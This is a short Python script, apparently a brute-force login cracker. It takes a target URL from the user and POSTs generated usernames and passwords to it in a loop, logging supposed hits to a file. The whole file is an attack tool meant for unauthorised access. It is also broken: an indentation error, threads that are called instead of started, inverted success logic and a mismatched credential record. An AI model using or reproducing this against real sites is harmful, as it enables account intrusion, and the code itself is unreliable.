import requests
import time
import threading

site=input("enter the target url : ")

def crack(rec):
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    y,z,u=0,0,0
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=13:
        long2=rec*2-1
        long3=rec*2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post(site, data=payload)
                bou=0
            except :
                print("lost connection, reconnection ...")
        
        if "invalid password" in r.text:
          print("login and password found  : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} invalid".format(user))

t1=threading.Thread(target=crack(1))
t2=threading.Thread(target=crack(2))
t3=threading.Thread(target=crack(3))
t4=threading.Thread(target=crack(4))
t5=threading.Thread(target=crack(5))
t6=threading.Thread(target=crack(6))
t7=threading.Thread(target=crack(7))
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t1.join()
t2.join()
t3.join()
t4.join()
t5.join()
t6.join()
t7.join()
